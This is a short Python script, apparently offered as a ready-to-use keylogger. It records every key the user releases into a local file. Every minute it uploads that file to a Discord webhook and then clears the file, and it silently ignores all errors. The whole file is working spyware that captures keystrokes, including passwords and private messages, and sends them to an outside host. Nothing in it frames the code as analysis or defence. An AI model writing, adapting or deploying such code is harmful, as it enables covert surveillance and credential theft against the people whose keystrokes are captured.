import keyboard
import time
import requests

webhook_url = 'WEBHOOK HERE'
log_file_path = 'keylog.txt'

def send_keylog_to_discord():
    try:
        with open(log_file_path, 'rb') as file:
            data = {'file': (log_file_path, file, 'text/plain')}
            response = requests.post(webhook_url, files=data)
            if response.status_code == 200:
                with open(log_file_path, 'w') as file:
                    file.write('')
    except Exception as e:
        pass

def on_key(event):
    key_name = event.name
    if len(key_name) == 1:
        file_text = key_name
    else:
        file_text = f'[{key_name.upper()}]'
    with open(log_file_path, 'a') as file:
        file.write(file_text + ' ')

keyboard.on_release(on_key)

while True:
    send_keylog_to_discord()
    time.sleep(60)
